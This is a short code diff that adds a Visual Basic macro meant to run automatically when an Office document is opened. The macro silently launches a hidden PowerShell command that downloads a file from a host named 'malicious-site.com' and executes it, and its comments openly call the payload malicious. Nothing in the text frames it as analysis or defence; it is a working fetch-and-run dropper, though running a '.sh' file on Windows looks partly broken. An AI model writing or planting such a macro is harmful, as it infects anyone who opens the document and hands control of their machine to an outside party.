@@ -1,0 +1,13 @@
+Sub AutoOpen()
+    ' This macro runs automatically when the document is opened
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' PowerShell command to download and execute the malicious script
+    Dim command As String
+    command = "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('http://malicious-site.com/payload.sh', 'C:\\Users\\Public\\payload.sh'); Start-Process 'C:\\Users\\Public\\payload.sh'"""
+    
+    ' Run the PowerShell command
+    objShell.Run command, 0
+End Sub
+
